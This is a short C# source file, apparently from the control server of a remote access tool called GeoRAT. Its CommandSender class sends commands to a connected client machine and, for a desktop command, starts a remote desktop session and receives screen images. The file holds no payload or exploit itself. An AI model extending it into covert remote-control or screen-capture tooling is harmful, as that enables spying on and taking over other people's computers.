
using System.Net.Sockets;
using GeoRAT.Core.Commands;
using GeoRAT.Server.Core;
using GeoRAT.Server.Net;


namespace GeoRAT.Server.CommandHandlers
{
    //This class sends commands to client using DataHandler. 
    class CommandSender
    {
        public delegate void DataReceived(byte[] buffer);
        public event DataReceived OnDataReceived;
        public CommandSender()
        {
            
        }

        public CommandSender(Socket s, Commands param1)
        {
            var sender = new DataHandler(s);
            switch (param1.CommandType)
            {

                case "Desktop": //If we want to start remote desktop session
                    sender.Send(param1);
                    var desktopHandler = new RemoteDesktopHandler(s);
                    desktopHandler.Start();
                    var data = desktopHandler.ReceiveImage();
                    OnDataReceived?.Invoke(data);
                    break;
                   default: //Just send command for now 
                    sender.Send(param1);
                    break;
            }
        }
    }
}
